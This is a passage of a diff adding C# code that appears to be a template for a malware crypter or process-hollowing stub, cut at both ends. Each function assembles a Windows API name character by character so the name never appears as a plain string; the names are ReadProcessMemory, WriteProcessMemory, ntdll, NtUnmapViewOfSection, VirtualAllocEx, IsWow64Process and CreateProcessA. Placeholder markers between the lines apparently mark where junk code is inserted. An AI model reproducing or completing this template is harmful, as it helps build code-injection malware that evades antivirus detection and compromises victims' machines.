+		   %$#@additionaltrigger___ReadProcessMemory___10@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___11@#$%
+		   parts[1]="e";
+		   %$#@additionaltrigger___ReadProcessMemory___12@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___13@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___14@#$%
+		   parts[2]="a";
+		   %$#@additionaltrigger___ReadProcessMemory___15@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___16@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___17@#$%
+		   parts[3]="d";
+		   %$#@additionaltrigger___ReadProcessMemory___18@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___19@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___20@#$%
+		   parts[4]="P";
+		   %$#@additionaltrigger___ReadProcessMemory___21@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___22@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___23@#$%
+		   parts[5]="r";
+		   %$#@additionaltrigger___ReadProcessMemory___24@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___25@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___26@#$%
+		   parts[6]="o";
+		   %$#@additionaltrigger___ReadProcessMemory___27@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___28@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___29@#$%
+		   parts[7]="c";
+		   %$#@additionaltrigger___ReadProcessMemory___30@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___31@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___32@#$%
+		   parts[8]="e";
+		   %$#@additionaltrigger___ReadProcessMemory___33@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___34@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___35@#$%
+		   parts[9]="s";
+		   %$#@additionaltrigger___ReadProcessMemory___36@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___37@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___38@#$%
+		   parts[10]="s";
+		   %$#@additionaltrigger___ReadProcessMemory___39@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___40@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___41@#$%
+		   parts[11]="M";
+		   %$#@additionaltrigger___ReadProcessMemory___42@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___43@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___44@#$%
+		   parts[12]="e";
+		   %$#@additionaltrigger___ReadProcessMemory___45@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___46@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___47@#$%
+		   parts[13]="m";
+		   %$#@additionaltrigger___ReadProcessMemory___48@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___49@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___50@#$%
+		   parts[14]="o";
+		   %$#@additionaltrigger___ReadProcessMemory___51@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___52@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___53@#$%
+		   parts[15]="r";
+		   %$#@additionaltrigger___ReadProcessMemory___54@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___55@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___56@#$%
+		   parts[16]="y";
+		   %$#@additionaltrigger___ReadProcessMemory___57@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___58@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___59@#$%
+
+		      for (int i = 0; i < 17; i++)
+              {
+		      %$#@additionaltrigger___ReadProcessMemory___60@#$%
+		      %$#@additionaltrigger___ReadProcessMemory___61@#$%
+		      %$#@additionaltrigger___ReadProcessMemory___62@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___ReadProcessMemory___63@#$%
+		      %$#@additionaltrigger___ReadProcessMemory___64@#$%
+		      %$#@additionaltrigger___ReadProcessMemory___65@#$%
+		      }
+		   %$#@additionaltrigger___ReadProcessMemory___66@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___67@#$%
+		   %$#@additionaltrigger___ReadProcessMemory___68@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT31@#$%
+		%$#@betweentriggerRSNDT32@#$%
+		%$#@betweentriggerRSNDT33@#$%
+		%$#@betweentriggerRSNDT34@#$%
+		%$#@betweentriggerRSNDT35@#$%
+		%$#@betweentriggerRSNDT36@#$%
+
+		public static string %$#@basictrigger___WriteProcessMemory___@#$%()
+		   {
+		   %$#@additionaltrigger___WriteProcessMemory___00@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___01@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___WriteProcessMemory___03@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___04@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___05@#$%
+		   string[] parts=new string[18];
+		   %$#@additionaltrigger___WriteProcessMemory___06@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___07@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___08@#$%
+
+		   parts[0]="W";
+		   %$#@additionaltrigger___WriteProcessMemory___09@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___10@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___11@#$%
+		   parts[1]="r";
+		   %$#@additionaltrigger___WriteProcessMemory___12@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___13@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___14@#$%
+		   parts[2]="i";
+		   %$#@additionaltrigger___WriteProcessMemory___15@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___16@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___17@#$%
+		   parts[3]="t";
+		   %$#@additionaltrigger___WriteProcessMemory___18@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___19@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___20@#$%
+		   parts[4]="e";
+		   %$#@additionaltrigger___WriteProcessMemory___21@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___22@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___23@#$%
+		   parts[5]="P";
+		   %$#@additionaltrigger___WriteProcessMemory___24@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___25@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___26@#$%
+		   parts[6]="r";
+		   %$#@additionaltrigger___WriteProcessMemory___27@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___28@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___29@#$%
+		   parts[7]="o";
+		   %$#@additionaltrigger___WriteProcessMemory___30@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___31@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___32@#$%
+		   parts[8]="c";
+		   %$#@additionaltrigger___WriteProcessMemory___33@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___34@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___35@#$%
+		   parts[9]="e";
+		   %$#@additionaltrigger___WriteProcessMemory___36@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___37@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___38@#$%
+		   parts[10]="s";
+		   %$#@additionaltrigger___WriteProcessMemory___39@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___40@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___41@#$%
+		   parts[11]="s";
+		   %$#@additionaltrigger___WriteProcessMemory___42@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___43@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___44@#$%
+		   parts[12]="M";
+		   %$#@additionaltrigger___WriteProcessMemory___45@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___46@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___47@#$%
+		   parts[13]="e";
+		   %$#@additionaltrigger___WriteProcessMemory___48@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___49@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___50@#$%
+		   parts[14]="m";
+		   %$#@additionaltrigger___WriteProcessMemory___51@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___52@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___53@#$%
+		   parts[15]="o";
+		   %$#@additionaltrigger___WriteProcessMemory___54@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___55@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___56@#$%
+		   parts[16]="r";
+		   %$#@additionaltrigger___WriteProcessMemory___57@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___58@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___59@#$%
+		   parts[17]="y";
+		   %$#@additionaltrigger___WriteProcessMemory___60@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___61@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___62@#$%
+
+		      for (int i = 0; i < 18; i++)
+              {
+		      %$#@additionaltrigger___WriteProcessMemory___63@#$%
+		      %$#@additionaltrigger___WriteProcessMemory___64@#$%
+		      %$#@additionaltrigger___WriteProcessMemory___65@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___WriteProcessMemory___66@#$%
+		      %$#@additionaltrigger___WriteProcessMemory___67@#$%
+		      %$#@additionaltrigger___WriteProcessMemory___68@#$%
+		      }
+		   %$#@additionaltrigger___WriteProcessMemory___69@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___70@#$%
+		   %$#@additionaltrigger___WriteProcessMemory___71@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT37@#$%
+		%$#@betweentriggerRSNDT38@#$%
+		%$#@betweentriggerRSNDT39@#$%
+		%$#@betweentriggerRSNDT40@#$%
+		%$#@betweentriggerRSNDT41@#$%
+		%$#@betweentriggerRSNDT42@#$%
+
+		public static string %$#@basictrigger___ntdll___@#$%()
+		   {
+		   %$#@additionaltrigger___ntdll___00@#$%
+		   %$#@additionaltrigger___ntdll___01@#$%
+		   %$#@additionaltrigger___ntdll___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___ntdll___03@#$%
+		   %$#@additionaltrigger___ntdll___04@#$%
+		   %$#@additionaltrigger___ntdll___05@#$%
+		   string[] parts=new string[5];
+		   %$#@additionaltrigger___ntdll___06@#$%
+		   %$#@additionaltrigger___ntdll___07@#$%
+		   %$#@additionaltrigger___ntdll___08@#$%
+
+		   parts[0]="n";
+		   %$#@additionaltrigger___ntdll___09@#$%
+		   %$#@additionaltrigger___ntdll___10@#$%
+		   %$#@additionaltrigger___ntdll___11@#$%
+		   parts[1]="t";
+		   %$#@additionaltrigger___ntdll___12@#$%
+		   %$#@additionaltrigger___ntdll___13@#$%
+		   %$#@additionaltrigger___ntdll___14@#$%
+		   parts[2]="d";
+		   %$#@additionaltrigger___ntdll___15@#$%
+		   %$#@additionaltrigger___ntdll___16@#$%
+		   %$#@additionaltrigger___ntdll___17@#$%
+		   parts[3]="l";
+		   %$#@additionaltrigger___ntdll___18@#$%
+		   %$#@additionaltrigger___ntdll___19@#$%
+		   %$#@additionaltrigger___ntdll___20@#$%
+		   parts[4]="l";
+		   %$#@additionaltrigger___ntdll___21@#$%
+		   %$#@additionaltrigger___ntdll___22@#$%
+		   %$#@additionaltrigger___ntdll___23@#$%
+
+		      for (int i = 0; i < 5; i++)
+              {
+		      %$#@additionaltrigger___ntdll___24@#$%
+		      %$#@additionaltrigger___ntdll___25@#$%
+		      %$#@additionaltrigger___ntdll___26@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___ntdll___27@#$%
+		      %$#@additionaltrigger___ntdll___28@#$%
+		      %$#@additionaltrigger___ntdll___29@#$%
+		      }
+		   %$#@additionaltrigger___ntdll___30@#$%
+		   %$#@additionaltrigger___ntdll___31@#$%
+		   %$#@additionaltrigger___ntdll___32@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT43@#$%
+		%$#@betweentriggerRSNDT44@#$%
+		%$#@betweentriggerRSNDT45@#$%
+		%$#@betweentriggerRSNDT46@#$%
+		%$#@betweentriggerRSNDT47@#$%
+		%$#@betweentriggerRSNDT48@#$%
+
+		public static string %$#@basictrigger___NtUnmapViewOfSection___@#$%()
+		   {
+		   %$#@additionaltrigger___NtUnmapViewOfSection___00@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___01@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___03@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___04@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___05@#$%
+		   string[] parts=new string[20];
+		   %$#@additionaltrigger___NtUnmapViewOfSection___06@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___07@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___08@#$%
+
+		   parts[0]="N";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___09@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___10@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___11@#$%
+		   parts[1]="t";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___12@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___13@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___14@#$%
+		   parts[2]="U";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___15@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___16@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___17@#$%
+		   parts[3]="n";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___18@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___19@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___20@#$%
+		   parts[4]="m";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___21@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___22@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___23@#$%
+		   parts[5]="a";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___24@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___25@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___26@#$%
+		   parts[6]="p";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___27@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___28@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___29@#$%
+		   parts[7]="V";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___30@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___31@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___32@#$%
+		   parts[8]="i";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___33@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___34@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___35@#$%
+		   parts[9]="e";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___36@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___37@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___38@#$%
+		   parts[10]="w";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___39@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___40@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___41@#$%
+		   parts[11]="O";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___42@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___43@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___44@#$%
+		   parts[12]="f";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___45@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___46@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___47@#$%
+		   parts[13]="S";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___48@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___49@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___50@#$%
+		   parts[14]="e";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___51@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___52@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___53@#$%
+		   parts[15]="c";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___54@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___55@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___56@#$%
+		   parts[16]="t";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___57@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___58@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___59@#$%
+		   parts[17]="i";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___60@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___61@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___62@#$%
+		   parts[18]="o";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___63@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___64@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___65@#$%
+		   parts[19]="n";
+		   %$#@additionaltrigger___NtUnmapViewOfSection___66@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___67@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___68@#$%
+
+		      for (int i = 0; i < 20; i++)
+              {
+		      %$#@additionaltrigger___NtUnmapViewOfSection___69@#$%
+		      %$#@additionaltrigger___NtUnmapViewOfSection___70@#$%
+		      %$#@additionaltrigger___NtUnmapViewOfSection___71@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___NtUnmapViewOfSection___72@#$%
+		      %$#@additionaltrigger___NtUnmapViewOfSection___73@#$%
+		      %$#@additionaltrigger___NtUnmapViewOfSection___74@#$%
+		      }
+		   %$#@additionaltrigger___NtUnmapViewOfSection___75@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___76@#$%
+		   %$#@additionaltrigger___NtUnmapViewOfSection___77@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT49@#$%
+		%$#@betweentriggerRSNDT50@#$%
+		%$#@betweentriggerRSNDT51@#$%
+		%$#@betweentriggerRSNDT52@#$%
+		%$#@betweentriggerRSNDT53@#$%
+		%$#@betweentriggerRSNDT54@#$%
+
+		public static string %$#@basictrigger___VirtualAllocEx___@#$%()
+		   {
+		   %$#@additionaltrigger___VirtualAllocEx___00@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___01@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___VirtualAllocEx___03@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___04@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___05@#$%
+		   string[] parts=new string[14];
+		   %$#@additionaltrigger___VirtualAllocEx___06@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___07@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___08@#$%
+
+		   parts[0]="V";
+		   %$#@additionaltrigger___VirtualAllocEx___09@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___10@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___11@#$%
+		   parts[1]="i";
+		   %$#@additionaltrigger___VirtualAllocEx___12@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___13@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___14@#$%
+		   parts[2]="r";
+		   %$#@additionaltrigger___VirtualAllocEx___15@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___16@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___17@#$%
+		   parts[3]="t";
+		   %$#@additionaltrigger___VirtualAllocEx___18@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___19@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___20@#$%
+		   parts[4]="u";
+		   %$#@additionaltrigger___VirtualAllocEx___21@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___22@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___23@#$%
+		   parts[5]="a";
+		   %$#@additionaltrigger___VirtualAllocEx___24@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___25@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___26@#$%
+		   parts[6]="l";
+		   %$#@additionaltrigger___VirtualAllocEx___27@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___28@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___29@#$%
+		   parts[7]="A";
+		   %$#@additionaltrigger___VirtualAllocEx___30@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___31@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___32@#$%
+		   parts[8]="l";
+		   %$#@additionaltrigger___VirtualAllocEx___33@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___34@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___35@#$%
+		   parts[9]="l";
+		   %$#@additionaltrigger___VirtualAllocEx___36@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___37@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___38@#$%
+		   parts[10]="o";
+		   %$#@additionaltrigger___VirtualAllocEx___39@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___40@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___41@#$%
+		   parts[11]="c";
+		   %$#@additionaltrigger___VirtualAllocEx___42@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___43@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___44@#$%
+		   parts[12]="E";
+		   %$#@additionaltrigger___VirtualAllocEx___45@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___46@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___47@#$%
+		   parts[13]="x";
+		   %$#@additionaltrigger___VirtualAllocEx___48@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___49@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___50@#$%
+
+		      for (int i = 0; i < 14; i++)
+              {
+		      %$#@additionaltrigger___VirtualAllocEx___51@#$%
+		      %$#@additionaltrigger___VirtualAllocEx___52@#$%
+		      %$#@additionaltrigger___VirtualAllocEx___53@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___VirtualAllocEx___54@#$%
+		      %$#@additionaltrigger___VirtualAllocEx___55@#$%
+		      %$#@additionaltrigger___VirtualAllocEx___56@#$%
+		      }
+		   %$#@additionaltrigger___VirtualAllocEx___57@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___58@#$%
+		   %$#@additionaltrigger___VirtualAllocEx___59@#$%
+
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT55@#$%
+		%$#@betweentriggerRSNDT56@#$%
+		%$#@betweentriggerRSNDT57@#$%
+		%$#@betweentriggerRSNDT58@#$%
+		%$#@betweentriggerRSNDT59@#$%
+		%$#@betweentriggerRSNDT60@#$%
+
+		public static string %$#@basictrigger___IsWow64Process___@#$%()
+		   {
+		   %$#@additionaltrigger___IsWow64Process___00@#$%
+		   %$#@additionaltrigger___IsWow64Process___01@#$%
+		   %$#@additionaltrigger___IsWow64Process___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___IsWow64Process___03@#$%
+		   %$#@additionaltrigger___IsWow64Process___04@#$%
+		   %$#@additionaltrigger___IsWow64Process___05@#$%
+		   string[] parts=new string[14];
+		   %$#@additionaltrigger___IsWow64Process___06@#$%
+		   %$#@additionaltrigger___IsWow64Process___07@#$%
+		   %$#@additionaltrigger___IsWow64Process___08@#$%
+
+		   parts[0]="I";
+		   %$#@additionaltrigger___IsWow64Process___09@#$%
+		   %$#@additionaltrigger___IsWow64Process___10@#$%
+		   %$#@additionaltrigger___IsWow64Process___11@#$%
+		   parts[1]="s";
+		   %$#@additionaltrigger___IsWow64Process___12@#$%
+		   %$#@additionaltrigger___IsWow64Process___13@#$%
+		   %$#@additionaltrigger___IsWow64Process___14@#$%
+		   parts[2]="W";
+		   %$#@additionaltrigger___IsWow64Process___15@#$%
+		   %$#@additionaltrigger___IsWow64Process___16@#$%
+		   %$#@additionaltrigger___IsWow64Process___17@#$%
+		   parts[3]="o";
+		   %$#@additionaltrigger___IsWow64Process___18@#$%
+		   %$#@additionaltrigger___IsWow64Process___19@#$%
+		   %$#@additionaltrigger___IsWow64Process___20@#$%
+		   parts[4]="w";
+		   %$#@additionaltrigger___IsWow64Process___21@#$%
+		   %$#@additionaltrigger___IsWow64Process___22@#$%
+		   %$#@additionaltrigger___IsWow64Process___23@#$%
+		   parts[5]="6";
+		   %$#@additionaltrigger___IsWow64Process___24@#$%
+		   %$#@additionaltrigger___IsWow64Process___25@#$%
+		   %$#@additionaltrigger___IsWow64Process___26@#$%
+		   parts[6]="4";
+		   %$#@additionaltrigger___IsWow64Process___27@#$%
+		   %$#@additionaltrigger___IsWow64Process___28@#$%
+		   %$#@additionaltrigger___IsWow64Process___29@#$%
+		   parts[7]="P";
+		   %$#@additionaltrigger___IsWow64Process___30@#$%
+		   %$#@additionaltrigger___IsWow64Process___31@#$%
+		   %$#@additionaltrigger___IsWow64Process___32@#$%
+		   parts[8]="r";
+		   %$#@additionaltrigger___IsWow64Process___33@#$%
+		   %$#@additionaltrigger___IsWow64Process___34@#$%
+		   %$#@additionaltrigger___IsWow64Process___35@#$%
+		   parts[9]="o";
+		   %$#@additionaltrigger___IsWow64Process___36@#$%
+		   %$#@additionaltrigger___IsWow64Process___37@#$%
+		   %$#@additionaltrigger___IsWow64Process___38@#$%
+		   parts[10]="c";
+		   %$#@additionaltrigger___IsWow64Process___39@#$%
+		   %$#@additionaltrigger___IsWow64Process___40@#$%
+		   %$#@additionaltrigger___IsWow64Process___41@#$%
+		   parts[11]="e";
+		   %$#@additionaltrigger___IsWow64Process___42@#$%
+		   %$#@additionaltrigger___IsWow64Process___43@#$%
+		   %$#@additionaltrigger___IsWow64Process___44@#$%
+		   parts[12]="s";
+		   %$#@additionaltrigger___IsWow64Process___45@#$%
+		   %$#@additionaltrigger___IsWow64Process___46@#$%
+		   %$#@additionaltrigger___IsWow64Process___47@#$%
+		   parts[13]="s";
+		   %$#@additionaltrigger___IsWow64Process___48@#$%
+		   %$#@additionaltrigger___IsWow64Process___49@#$%
+		   %$#@additionaltrigger___IsWow64Process___50@#$%
+
+		      for (int i = 0; i < 14; i++)
+              {
+		      %$#@additionaltrigger___IsWow64Process___51@#$%
+		      %$#@additionaltrigger___IsWow64Process___52@#$%
+		      %$#@additionaltrigger___IsWow64Process___53@#$%
+			  rez=rez+parts[i];
+		      %$#@additionaltrigger___IsWow64Process___54@#$%
+		      %$#@additionaltrigger___IsWow64Process___55@#$%
+		      %$#@additionaltrigger___IsWow64Process___56@#$%
+		      }
+		   %$#@additionaltrigger___IsWow64Process___57@#$%
+		   %$#@additionaltrigger___IsWow64Process___58@#$%
+		   %$#@additionaltrigger___IsWow64Process___59@#$%
+		   return rez;
+		   }
+
+		%$#@betweentriggerRSNDT61@#$%
+		%$#@betweentriggerRSNDT62@#$%
+		%$#@betweentriggerRSNDT63@#$%
+		%$#@betweentriggerRSNDT64@#$%
+		%$#@betweentriggerRSNDT65@#$%
+		%$#@betweentriggerRSNDT66@#$%
+
+		public static string %$#@basictrigger___CreateProcessA___@#$%()
+		   {
+		   %$#@additionaltrigger___CreateProcessA___00@#$%
+		   %$#@additionaltrigger___CreateProcessA___01@#$%
+		   %$#@additionaltrigger___CreateProcessA___02@#$%
+		   string rez="";
+		   %$#@additionaltrigger___CreateProcessA___03@#$%
+		   %$#@additionaltrigger___CreateProcessA___04@#$%
+		   %$#@additionaltrigger___CreateProcessA___05@#$%
+		   string[] parts=new string[14];
+		   %$#@additionaltrigger___CreateProcessA___06@#$%
+		   %$#@additionaltrigger___CreateProcessA___07@#$%
+		   %$#@additionaltrigger___CreateProcessA___08@#$%
+
+		   parts[0]="C";
+		   %$#@additionaltrigger___CreateProcessA___09@#$%
+		   %$#@additionaltrigger___CreateProcessA___10@#$%
+		   %$#@additionaltrigger___CreateProcessA___11@#$%
+		   parts[1]="r";
+		   %$#@additionaltrigger___CreateProcessA___12@#$%
+		   %$#@additionaltrigger___CreateProcessA___13@#$%
+		   %$#@additionaltrigger___CreateProcessA___14@#$%
+		   parts[2]="e";
+		   %$#@additionaltrigger___CreateProcessA___15@#$%
+		   %$#@additionaltrigger___CreateProcessA___16@#$%
+		   %$#@additionaltrigger___CreateProcessA___17@#$%
+		   parts[3]="a";
+		   %$#@additionaltrigger___CreateProcessA___18@#$%
+		   %$#@additionaltrigger___CreateProcessA___19@#$%
+		   %$#@additionaltrigger___CreateProcessA___20@#$%
+		   parts[4]="t";
+		   %$#@additionaltrigger___CreateProcessA___21@#$%
+		   %$#@additionaltrigger___CreateProcessA___22@#$%
+		   %$#@additionaltrigger___CreateProcessA___23@#$%
+		   parts[5]="e";
+		   %$#@additionaltrigger___CreateProcessA___24@#$%
+		   %$#@additionaltrigger___CreateProcessA___25@#$%
+		   %$#@additionaltrigger___CreateProcessA___26@#$%
+		   parts[6]="P";
+		   %$#@additionaltrigger___CreateProcessA___27@#$%
+		   %$#@additionaltrigger___CreateProcessA___28@#$%
+		   %$#@additionaltrigger___CreateProcessA___29@#$%
+		   parts[7]="r";
+		   %$#@additionaltrigger___CreateProcessA___30@#$%
+		   %$#@additionaltrigger___CreateProcessA___31@#$%
+		   %$#@additionaltrigger___CreateProcessA___32@#$%
+		   parts[8]="o";
+		   %$#@additionaltrigger___CreateProcessA___33@#$%
+		   %$#@additionaltrigger___CreateProcessA___34@#$%
+		   %$#@additionaltrigger___CreateProcessA___35@#$%
+		   parts[9]="c";
+		   %$#@additionaltrigger___CreateProcessA___36@#$%
